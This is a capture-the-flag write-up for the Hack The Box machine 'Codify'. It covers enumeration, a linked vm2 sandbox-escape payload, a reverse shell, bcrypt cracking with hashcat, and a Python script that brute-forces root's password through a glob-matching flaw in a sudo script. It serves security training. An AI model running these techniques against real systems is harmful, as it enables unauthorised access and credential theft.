---
slug: /write-up/htb/easy/codify
pagination_next: null
pagination_prev: null
---

## Enumeration

```bash
curl 10.10.11.239                                                  
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://codify.htb/">here</a>.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at 10.10.11.239 Port 80</address>
</body></html>
```
Let's add the host to /etc/hosts

nmap reports several things opened:

```bash
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
```

The port 80 is a webserver that hosts a NodeJS editor to execute NodeJS in a sandboxed scenario.

Port 3000 looks the same.

The sandbox looks like it's using the vm2 library:
```
 The vm2 library is a widely used and trusted tool for sandboxing JavaScript. It adds an extra layer of security to prevent potentially harmful code from causing harm to your system. We take the security and reliability of our platform seriously, and we use vm2 to ensure a safe testing environment for your code.
```
The sandbox has the following limitations: http://codify.htb/limitations

The editor works by sending a POST request with base64 content:

```
curl 'http://codify.htb/run' -X POST -H 'Referer: http://codify.htb/editor' -H 'Content-Type: application/json' -H 'Origin: http://codify.htb' --data-raw '{"code":"YQ=="}'
```
This request belongs to the code `a`:
```bash
└─$ echo YQ== | base64 -d
a
```

## Foothold

Look at Google for vm2 escape, found this payload: https://security.snyk.io/vuln/SNYK-JS-VM2-5537100

Prepared the script a bit and got it, then send a reverse shell and we're in as `svc` user and then improve to a good shell.

Found the user `joshua` on /etc/passwd.

Checking the contents of the server, there's the `contact` folder which looks like an old nodejs app. It has a sqlite database which contains a users table with an entry for joshua. Let's try to crack the bcrypt hash stored there.

```bash
hashcat exfil/hash -m 3200 -a 0 /usr/share/wordlists/rockyou.txt
```

Found the password for user `joshua`, now connect with SSH, and we're in and get can get the user flag.


## Privilege escalation

The user `joshua` can execute this command as root:

```bash
joshua@codify:~$ sudo -l
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

In that script, there's one `if` statement that checks the user input password with the credentials stored in one file:

```bash
if [[ $DB_PASS == $USER_PASS ]]; then
```

The problem with that is, this if does not perform string comparison, it performs pattern matching. Which means that it `USER_PASS` is `*`, the if will pass. 

The pattern matching will work with any character, for instance let's say the password is `password`, if the user provides the password `p*` it will pass, so we can slowly bruce-force each character thanks to pattern matching with the following script:

```python
import string
import subprocess
import time

all_characters = list(string.ascii_letters + string.digits)
password = ""
while True:
    for char in all_characters:
        command = f"echo '{password}{char}*' | sudo /opt/scripts/mysql-backup.sh"
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        if "Password confirmed" in output:
            password += char
            print(password)
            time.sleep(1)
```

And found the password for root, now we can run `su` and provide that password and we got root access.